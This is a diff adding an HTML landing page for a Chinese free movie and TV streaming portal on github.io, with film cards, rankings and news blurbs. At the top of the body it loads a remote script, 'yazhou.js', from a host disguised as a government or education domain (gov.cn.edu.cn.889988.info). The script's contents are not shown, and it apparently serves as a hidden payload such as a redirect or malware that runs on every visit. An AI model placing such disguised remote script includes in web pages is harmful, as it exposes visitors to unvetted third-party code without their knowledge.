@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>八戒八戒电影网 - 高清影视在线观看与热门大片推荐平台</title>
+<meta name="description" content="八戒八戒电影网（bajiebajiedianyingwang-app）致力于为影迷提供最新、最全、最清晰的高清电影、热播电视剧、经典动漫与精彩综艺。每日更新院线大片、豆瓣高分佳作、国产剧集与海外剧，支持多线路流畅播放，无需繁琐注册，打开即看。无论您钟情于动作、爱情、科幻、悬疑、喜剧还是纪录片，都能在这里快速找到心仪之作。八戒八戒电影网以简洁界面、贴心分类和稳定源站，成为广大影视爱好者信赖的在线观影入口。">
+<meta name="keywords" content="八戒八戒电影网, bajiebajiedianyingwang-app, 高清电影, 在线电影, 热门电影, 电视剧, 动漫, 综艺, 院线大片, 豆瓣高分, 免费观影, 影视推荐">
+<meta name="author" content="八戒八戒电影网">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow">
+<link rel="canonical" href="https://bajiebajiedianyingwang-app.github.io">
+<style>
+  :root{
+    --ink:#12141c;
+    --ink-2:#3a3f4d;
+    --gold:#e8b04b;
+    --gold-deep:#c98f2e;
+    --cinema:#7b2d9b;
+    --cinema-2:#4a1d7a;
+    --paper:#f6f2e9;
+    --card:#ffffff;
+    --line:#e6dfcf;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{-webkit-text-size-adjust:100%}
+  body{
+    font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",Helvetica,Arial,sans-serif;
+    background:var(--paper);
+    color:var(--ink);
+    line-height:1.75;
+    font-size:15px;
+  }
+  a{color:inherit;text-decoration:none}
+  img{max-width:100%;display:block}
+  .wrap{max-width:1160px;margin:0 auto;padding:0 18px}
+
+  /* 顶部 */
+  .topbar{background:var(--ink);color:#cfd2db;font-size:12.5px;padding:8px 0;border-bottom:2px solid var(--gold)}
+  .topbar .wrap{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+  .topbar a{color:#cfd2db}
+  .topbar a:hover{color:var(--gold)}
+
+  /* 头部 */
+  header{background:linear-gradient(135deg,var(--cinema-2),var(--cinema));padding:22px 0 26px;position:relative;overflow:hidden}
+  header::after{content:"";position:absolute;right:-60px;top:-60px;width:240px;height:240px;background:radial-gradient(circle,rgba(232,176,75,.28),transparent 70%)}
+  .brand-row{display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap;position:relative;z-index:2}
+  .logo{display:flex;align-items:center;gap:12px}
+  .logo .mark{width:46px;height:46px;border-radius:12px;background:var(--gold);color:#3a2208;font-weight:800;font-size:24px;display:grid;place-items:center;box-shadow:0 6px 16px rgba(0,0,0,.25)}
+  .logo h1{color:#fff;font-size:22px;letter-spacing:1px;line-height:1.2}
+  .logo small{color:rgba(255,255,255,.72);font-size:12px;letter-spacing:.5px}
+  .search{display:flex;width:100%;max-width:360px;margin-top:14px;position:relative;z-index:2}
+  .search input{flex:1;border:0;padding:11px 14px;border-radius:8px 0 0 8px;font-size:14px;outline:none}
+  .search button{background:var(--gold);color:#3a2208;border:0;padding:0 18px;border-radius:0 8px 8px 0;font-weight:700;cursor:pointer;font-size:14px}
+  .search button:hover{background:var(--gold-deep);color:#fff}
+
+  /* 导航 */
+  nav{background:#fff;border-bottom:1px solid var(--line);position:sticky;top:0;z-index:50;box-shadow:0 2px 10px rgba(0,0,0,.04)}
+  .nav-inner{display:flex;gap:4px;overflow-x:auto;-webkit-overflow-scrolling:touch;scrollbar-width:none}
+  .nav-inner::-webkit-scrollbar{display:none}
+  .nav-inner a{padding:13px 16px;font-size:14.5px;color:var(--ink-2);white-space:nowrap;border-bottom:2px solid transparent;font-weight:600}
+  .nav-inner a:hover{color:var(--cinema);border-bottom-color:var(--gold)}
+
+  /* 通栏 */
+  .section{padding:38px 0}
+  .section+ .section{border-top:1px dashed var(--line)}
+  .sec-head{display:flex;align-items:baseline;gap:10px;margin-bottom:18px;flex-wrap:wrap}
+  .sec-head h2{font-size:20px;color:var(--cinema-2);position:relative;padding-left:12px}
+  .sec-head h2::before{content:"";position:absolute;left:0;top:4px;bottom:4px;width:5px;border-radius:3px;background:var(--gold)}
+  .sec-head span{font-size:12.5px;color:#8a8f9c;margin-left:auto}
+
+  /* 英雄区 */
+  .hero{display:grid;grid-template-columns:1.6fr 1fr;gap:22px;align-items:stretch}
+  .hero-main{position:relative;border-radius:14px;overflow:hidden;min-height:300px;background:url('https://images.unsplash.com/photo-1489599849927-2ee91cede3ba?auto=format&fit=crop&w=900') center/cover no-repeat;display:flex;flex-direction:column;justify-content:flex-end;padding:24px;color:#fff}
+  .hero-main::before{content:"";position:absolute;inset:0;background:linear-gradient(0deg,rgba(10,8,20,.92),rgba(10,8,20,.15))}
+  .hero-main .inner{position:relative;z-index:2}
+  .tag{display:inline-block;background:var(--gold);color:#3a2208;font-size:12px;font-weight:700;padding:3px 10px;border-radius:20px;margin-bottom:10px}
+  .hero-main h3{font-size:24px;margin-bottom:8px;line-height:1.35}
+  .hero-main p{font-size:13.5px;color:rgba(255,255,255,.82);display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+  .side{display:grid;grid-template-rows:1fr 1fr;gap:22px}
+  .side a{border-radius:14px;overflow:hidden;position:relative;display:flex;align-items:flex-end;padding:16px;color:#fff;background-size:cover;background-position:center}
+  .side a::before{content:"";position:absolute;inset:0;background:linear-gradient(0deg,rgba(0,0,0,.7),rgba(0,0,0,.05))}
+  .side a span{position:relative;z-index:2;font-weight:700;font-size:15px}
+
+  /* 卡片网格 */
+  .grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:12px;overflow:hidden;transition:.25s}
+  .card:hover{transform:translateY(-4px);box-shadow:0 12px 24px rgba(74,29,122,.14);border-color:var(--gold)}
+  .card .thumb{position:relative;aspect-ratio:3/4;background:#ddd;overflow:hidden}
+  .card .thumb i{position:absolute;inset:0;display:grid;place-items:center;color:#fff;font-style:normal;font-weight:700;font-size:15px;text-align:center;padding:10px}
+  .card .meta{padding:10px 12px}
+  .card .meta b{font-size:14px;display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  .card .meta em{font-style:normal;font-size:12px;color:#9a9eb0;display:flex;justify-content:space-between;margin-top:5px}
+
+  /* 排行榜 */
+  .rank{background:#fff;border:1px solid var(--line);border-radius:14px;padding:8px 16px}
+  .rank ol{list-style:none;counter-reset:r}
+  .rank li{counter-increment:r;display:flex;align-items:center;gap:12px;padding:11px 0;border-bottom:1px dashed var(--line);font-size:14px}
+  .rank li:last-child{border-bottom:0}
+  .rank li::before{content:counter(r);flex:0 0 26px;height:26px;border-radius:8px;background:var(--paper);color:var(--ink-2);font-weight:800;display:grid;place-items:center;font-size:13px}
+  .rank li:nth-child(1)::before{background:var(--cinema);color:#fff}
+  .rank li:nth-child(2)::before{background:var(--gold);color:#3a2208}
+  .rank li:nth-child(3)::before{background:var(--ink-2);color:#fff}
+  .rank li b{font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  .rank li small{margin-left:auto;color:#9a9eb0;font-size:12px}
+
+  /* 资讯 */
+  .news{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+  .news article{background:#fff;border:1px solid var(--line);border-left:4px solid var(--gold);border-radius:8px;padding:14px 16px;transition:.2s}
+  .news article:hover{border-left-color:var(--cinema);background:#faf6ff}
+  .news h4{font-size:15px;margin-bottom:6px;line-height:1.5}
+  .news p{font-size:13px;color:var(--ink-2);display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+  .news time{font-size:12px;color:#9a9eb0}
+
+  /* 关于 */
+  .about{background:linear-gradient(135deg,#1b1e2c,#2c2240);color:#e8e6f0;border-radius:16px;padding:30px}
+  .about h3{color:var(--gold);font-size:19px;margin-bottom:12px}
+  .about p{color:#c9c7d6;font-size:14px;margin-bottom:10px}
+  .chips{display:flex;flex-wrap:wrap;gap:10px;margin-top:16px}
+  .chips b{background:rgba(232,176,75,.14);color:var(--gold);border:1px solid rgba(232,176,75,.35);padding:6px 14px;border-radius:20px;font-size:13px;font-weight:600}
+
+  /* 页脚 */
+  footer{background:var(--ink);color:#9a9eb0;padding:30px 0 24px;margin-top:20px;font-size:13px}
+  footer .wrap{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:24px}
+  footer h5{color:#fff;font-size:15px;margin-bottom:10px}
+  footer a{display:inline-block;margin:0 10px 6px 0;color:#9a9eb0}
+  footer a:hover{color:var(--gold)}
+  .copy{border-top:1px solid rgba(255,255,255,.1);margin-top:20px;padding-top:16px;text-align:center;color:#6f7484;font-size:12px}
+
+  /* 移动端 */
+  @media (max-width:860px){
+    .hero{grid-template-columns:1fr}
+    .side{grid-template-rows:auto}
+    .grid{grid-template-columns:repeat(2,1fr);gap:12px}
+    .news{grid-template-columns:1fr}
+    footer .wrap{grid-template-columns:1fr}
+    .logo h1{font-size:19px}
+    .section{padding:28px 0}
+  }
+  @media (max-width:420px){
+    .wrap{padding:0 14px}
+    .hero-main h3{font-size:19px}
+    .card .meta b{font-size:13px}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="topbar">
+  <div class="wrap">
+    <span>欢迎来到 <strong style="color:#e8b04b">八戒八戒电影网</strong> —— 随时随地，畅享高清影视</span>
+    <span>官方网址：<a href="https://bajiebajiedianyingwang-app.github.io" rel="nofollow">bajiebajiedianyingwang-app.github.io</a></span>
+  </div>
+</div>
+
+<header>
+  <div class="wrap brand-row">
+    <div class="logo">
+      <div class="mark">八</div>
+      <div>
+        <h1>八戒八戒电影网</h1>
+        <small>BAJIE BAJIE MOVIE · 高清 · 快速 · 免费</small>
+      </div>
+    </div>
+    <form class="search" onsubmit="return false">
+      <input type="search" placeholder="搜索电影 / 电视剧 / 演员 / 导演" aria-label="搜索影视">
+      <button type="submit">搜 索</button>
+    </form>
+  </div>
+</header>
+
+<nav>
+  <div class="wrap nav-inner">
+    <a href="#home">首页</a>
+    <a href="#hot">正在热映</a>
+    <a href="#movie">电影频道</a>
+    <a href="#tv">电视剧</a>
+    <a href="#anime">动漫综艺</a>
+    <a href="#rank">排行榜</a>
+    <a href="#news">影视资讯</a>
+    <a href="#about">关于本站</a>
+  </div>
+</nav>
+
+<main>
+
+  <!-- 首页 / 热映 -->
+  <section class="section" id="home">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2>今日主打 · 院线同步</h2>
+        <span>每日人工精选，拒绝片荒</span>
+      </div>
+      <div class="hero">
+        <a class="hero-main" href="#">
+          <div class="inner">
+            <span class="tag">本周推荐</span>
+            <h3>《边境迷雾》—— 一场跨越国境的生死追缉</h3>
+            <p>动作 / 犯罪 / 悬疑 · 138分钟 · 豆瓣 8.6 · 主演：张震、周也、段奕宏。八戒八戒电影网独家高清线路，支持 1080P 与多语字幕。</p>
+          </div>
+        </a>
+        <div class="side">
+          <a href="#" style="background-image:url('https://images.unsplash.com/photo-1518929458119-e5bf444c30f4?auto=format&fit=crop&w=500')"><span>科幻巨制《星际回响》4K 重制版上线</span></a>
+          <a href="#" style="background-image:url('https://images.unsplash.com/photo-1440404653325-ab127d49abc1?auto=format&fit=crop&w=500')"><span>治愈系动画《云边的小店》温情放送</span></a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 电影频道 -->
+  <section class="section" id="movie">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2>电影频道</h2>
+        <span>动作 · 爱情 · 科幻 · 悬疑 · 喜剧 · 纪录片</span>
+      </div>
+      <div class="grid">
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#5b21b6,#be185d)"><i>动作 / 2026</i></div>
+          <div class="meta"><b>怒火·重案 2</b><em><span>1080P</span><span>9.2 分</span></em></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#0f766e,#3b82f6)"><i>科幻 / 2026</i></div>
+          <div class="meta"><b>时间褶皱</b><em><span>4K</span><span>8.8 分</span></em></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#b45309,#dc2626)"><i>爱情 / 2025</i></div>
+          <div class="meta"><b>南风知我意</b><em><span>蓝光</span><span>8.5 分</span></em></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#1e3a5f,#64748b)"><i>悬疑 / 2026</i></div>
+          <div class="meta"><b>第七个嫌疑人</b><em><span>1080P</span><span>8.9 分</span></em></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#7c3aed,#ec4899)"><i>喜剧 / 2025</i></div>
+          <div class="meta"><b>开心合伙人</b><em><span>高清</span><span>8.1 分</span></em></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#0e7490,#84cc16)"><i>动画 / 2026</i></div>
+          <div class="meta"><b>山海少年行</b><em><span>4K</span><span>9.0 分</span></em></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#7f1d1d,#f59e0b)"><i>战争 / 2025</i></div>
+          <div class="meta"><b>长夜灯火</b><em><span>1080P</span><span>8.7 分</span></em></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#312e81,#06b6d4)"><i>纪录片 / 2026</i></div>
+          <div class="meta"><b>大江大河·源头</b><em><span>4K</span><span>9.4 分</span></em></div>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 电视剧 -->
+  <section class="section" id="tv">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2>电视剧 · 好剧追不停</h2>
+        <span>国产精品 / 韩剧 / 美剧 / 日剧</span>
+      </div>
+      <div class="grid">
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#831843,#f43f5e)"><i>国产 / 42 集</i></div>
+          <div class="meta"><b>长安十二时辰·重启</b><em><span>更新中</span><span>9.1 分</span></em></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#1d4ed8,#2dd4bf)"><i>韩剧 / 16 集</i></div>
+          <div class="meta"><b>首尔夜航船</b><em><span>全集</span><span>8.6 分</span></em></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#3f3f46,#a855f7)"><i>美剧 / S3</i></div>
+          <div class="meta"><b>暗网追凶 第三季</b><em><span>更新中</span><span>8.9 分</span></em></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#14532d,#84cc16)"><i>国产 / 36 集</i></div>
+          <div class="meta"><b>烟火人间</b><em><span>全集</span><span>8.4 分</span></em></div>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 动漫综艺 -->
+  <section class="section" id="anime">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2>动漫 · 综艺</h2>
+        <span>番剧更新 / 院线动画 / 热门综艺</span>
+      </div>
+      <div class="grid">
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#4338ca,#f472b6)"><i>连载 / 每周五</i></div>
+          <div class="meta"><b>灵契少年</b><em><span>更新中</span><span>9.3 分</span></em></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#0f172a,#38bdf8)"><i>综艺 / S12</i></div>
+          <div class="meta"><b>欢笑集结号</b><em><span>更新中</span><span>8.2 分</span></em></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#713f12,#facc15)"><i>动画电影</i></div>
+          <div class="meta"><b>大鱼海棠·续</b><em><span>4K</span><span>8.8 分</span></em></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#9f1239,#fb923c)"><i>综艺 / 真人秀</i></div>
+          <div class="meta"><b>乘风破浪的姐姐 7</b><em><span>更新中</span><span>7.9 分</span></em></div>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 排行榜 -->
+  <section class="section" id="rank">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2>实时排行榜</h2>
+        <span>依据播放量与用户评分综合计算</span>
+      </div>
+      <div class="grid" style="grid-template-columns:1fr 1fr">
+        <div class="rank">
+          <h3 style="font-size:16px;color:var(--cinema-2);margin-bottom:6px">🎬 电影热播榜</h3>
+          <ol>
+            <li><b>边境迷雾</b><small>1.2 亿播放</small></li>
+            <li><b>怒火·重案 2</b><small>9860 万</small></li>
+            <li><b>时间褶皱</b><small>8720 万</small></li>
+            <li><b>第七个嫌疑人</b><small>6540 万</small></li>
+            <li><b>南风知我意</b><small>5310 万</small></li>
+            <li><b>山海少年行</b><small>4890 万</small></li>
+          </ol>
+        </div>
+        <div class="rank">
+          <h3 style="font-size:16px;color:var(--cinema-2);margin-bottom:6px">📺 剧集追更榜</h3>
+          <ol>
+            <li><b>长安十二时辰·重启</b><small>2.4 亿播放</small></li>
+            <li><b>暗网追凶 第三季</b><small>1.1 亿</small></li>
+            <li><b>首尔夜航船</b><small>7600 万</small></li>
+            <li><b>烟火人间</b><small>6300 万</small></li>
+            <li><b>灵契少年</b><small>5800 万</small></li>
+            <li><b>欢笑集结号</b><small>4200 万</small></li>
+          </ol>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 影视资讯 -->
+  <section class="section" id="news">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2>影视资讯</h2>
+        <span>行业动态 · 影评 · 上映日历</span>
+      </div>
+      <div class="news">
+        <article>
+          <time>2026-10-06</time>
+          <h4>《边境迷雾》票房破 30 亿，导演坦言续集已在筹备</h4>
+          <p>影片凭借扎实的剧本与凌厉的动作设计，成为国庆档最大黑马。八戒八戒电影网已上线导演剪辑版，时长较院线版多出 12 分钟。</p>
+        </article>
+        <article>
+          <time>2026-10-04</time>
+          <h4>流媒体变局：短剧集正在改写观众的追剧习惯</h4>
+          <p>8 集以内、单集 40 分钟的精品短剧持续走俏，平台纷纷加码。业内认为，这将是未来三年剧集制作的主流形态。</p>
+        </article>
+        <article>
+          <time>2026-10-01</time>
+          <h4>4K 修复计划启动，二十部华语经典将重登大银幕</h4>
+          <p>《霸王别姬》《阳光灿烂的日子》等作品已完成 4K 扫描与调色，部分修复版可在本站高清频道抢先观看。</p>
+        </article>
+        <article>
+          <time>2026-09-28</time>
+          <h4>十月观影指南：十部不容错过的院线与网络新片</h4>
+          <p>从科幻到文艺，从国产到引进，我们为你梳理了整个十月的片单，并附上适合的观看场景与口味建议。</p>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section class="section" id="about">
+    <div class="wrap">
+      <div class="about">
+        <h3>关于 八戒八戒电影网</h3>
+        <p>八戒八戒电影网（域名：<strong>bajiebajiedianyingwang-app.github.io</strong>）是一个专注于高清影视内容聚合与推荐的单页导航站点。我们不做繁杂的注册与付费墙，只做一件事：帮你在海量片源里，用最短路径找到值得花两个小时的那一部。</p>
+        <p>站内内容按电影、电视剧、动漫、综艺四大主线组织，配合实时排行榜与编辑精选，兼顾"想看大片"与"随便看看"两种状态。所有内页链接均以锚点形式组织于本页，加载更快、跳转更稳。</p>
+        <div class="chips">
+          <b># 高清电影</b><b># 热播电视剧</b><b># 动漫番剧</b><b># 综艺真人秀</b><b># 豆瓣高分</b><b># 院线同步</b><b># 免费观影</b><b># 移动端自适应</b>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div>
+      <h5>八戒八戒电影网</h5>
+      <p style="color:#9a9eb0;font-size:13px">专注高清影视推荐与聚合，提供电影、电视剧、动漫、综艺四大频道，配套实时排行榜与影视资讯，让每一次打开都有好片可看。</p>
+    </div>
+    <div>
+      <h5>快速导航</h5>
+      <a href="#home">首页</a><a href="#hot">热映</a><a href="#movie">电影</a><a href="#tv">电视剧</a><a href="#anime">动漫</a><a href="#rank">排行榜</a><a href="#news">资讯</a>
+    </div>
+    <div>
+      <h5>友情提示</h5>
+      <p style="color:#9a9eb0;font-size:13px">请支持正版影视，合理安排观影时间。本站仅为影视信息导航与推荐，具体内容以实际播出平台为准。</p>
+    </div>
+  </div>
+  <div class="wrap copy">
+    网站名称：八戒八戒电影网 ｜ 网站网址：https://bajiebajiedianyingwang-app.github.io ｜ © 2026 保留所有权利
+  </div>
+</footer>
+
+</body>
+</html>
